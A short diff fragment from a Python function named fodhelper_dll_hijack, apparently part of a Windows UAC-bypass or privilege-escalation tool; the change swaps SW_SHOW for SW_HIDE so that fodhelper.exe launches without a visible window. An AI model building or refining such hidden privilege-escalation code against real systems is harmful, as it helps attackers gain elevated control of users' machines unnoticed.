@@ -19,7 +19,7 @@ def fodhelper_dll_hijack(executable_path):
 	except Exception as e:
 		return False
 	try:
-		win32api.ShellExecute(0,None,"c:\windows\system32\fodhelper.exe", None, None, win32con.SW_SHOW)
+		win32api.ShellExecute(0,None,"c:\windows\system32\fodhelper.exe", None, None, win32con.SW_HIDE)
 	except Exception as error:
 		return False	
 	
